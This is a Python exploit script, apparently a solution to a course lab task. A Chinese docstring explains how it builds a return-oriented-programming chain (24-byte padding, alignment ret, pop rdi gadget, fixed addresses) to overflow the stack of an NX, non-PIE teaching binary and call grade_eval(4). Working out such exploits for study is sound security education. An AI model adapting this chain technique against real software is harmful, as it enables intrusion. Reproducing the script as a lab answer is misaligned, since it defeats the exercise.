#!/usr/bin/env python3
"""Task 3 — ROP  (binary: attack/dark-calc-nx)

实验文档要求：dark-calc-nx 栈不可执行(NX)、栈地址随机化、non-PIE。
用 ROP 调用 grade_eval(4)，输出
    Hope A will be your grade!

因为 non-PIE，代码地址固定，ROP 与栈地址无关，ASLR 下依然稳定。

gadget（文档提示在 0x4019d0 ~ 0x401ae3 之间，objdump 中搜 pop）：
    pop rdi; ret  = 0x401a33   (__libc_csu_init 内)
    ret (对齐)    = 0x401a34
    grade_eval    = 0x401978

返回地址偏移 = 16(buffer)+8(saved rbp) = 24。
链:  [ 填充 24B ][ ret 对齐 ][ pop rdi ][ 4 ][ grade_eval ]
其中多插一个裸 `ret` 做 16 字节栈对齐——否则 grade_eval 里的 printf 可能因
movaps 未对齐而崩溃（文档亦提示此坑）。

已验证（ASLR 开启，多次稳定）：输出 "Hope A will be your grade!"。
"""
import sys, struct

pop_rdi    = 0x401a33
ret_align  = 0x401a34
grade_eval = 0x401978

p  = b"A" * 24                          # 垫到返回地址
p += struct.pack("<Q", ret_align)       # 栈对齐
p += struct.pack("<Q", pop_rdi)
p += struct.pack("<Q", 4)               # rdi = 4
p += struct.pack("<Q", grade_eval)      # grade_eval(4)

sys.stdout.buffer.write(p + b"\n")
